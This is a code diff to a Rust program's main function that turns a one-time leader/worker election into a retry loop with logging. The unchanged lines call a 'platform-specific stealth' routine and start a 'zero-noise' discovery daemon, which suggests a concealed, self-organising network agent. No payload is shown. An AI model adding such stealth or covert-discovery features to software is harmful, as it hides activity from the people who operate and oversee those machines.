@@ -23,21 +23,36 @@ async fn main() {
     // Apply platform-specific stealth
     stealth::check_and_apply_stealth();
 
-    // Start Zero-Noise Discovery daemon
+    // Discovery Daemon runs in background always
     let disc = Arc::new(ZeroNoiseDiscovery::new());
     let dc = disc.clone();
     tokio::spawn(async move {
         dc.run_daemon().await;
     });
 
-    // Run election to determine role
-    let election = Arc::new(ElectionService::new().await);
-    let role = election.run_discovery().await;
+    loop {
+        info!("[Main] Entering Election Phase...");
+        // Run election to determine role
+        let election = Arc::new(ElectionService::new().await);
+        let role = election.run_discovery().await;
 
-    // Execute based on role
-    match role {
-        NodeRole::Leader => run_leader_mode(election).await,
-        NodeRole::Worker => run_worker_mode().await,
-        _ => error!("Unexpected Role Unbound"),
+        // Execute based on role
+        match role {
+            NodeRole::Leader => {
+                info!("[Main] Role: LEADER");
+                run_leader_mode(election).await;
+                // Leader essentially runs forever unless crashed/killed
+            }
+            NodeRole::Worker(addr) => {
+                info!("[Main] Role: WORKER (Leader: {})", addr);
+                run_worker_mode(addr).await;
+                // If this returns, connection to Leader failed too many times
+                info!("[Main] Worker lost connection to Leader. Restarting Election...");
+            }
+            _ => {
+                error!("Unexpected Role Unbound");
+                tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+            }
+        }
     }
 }
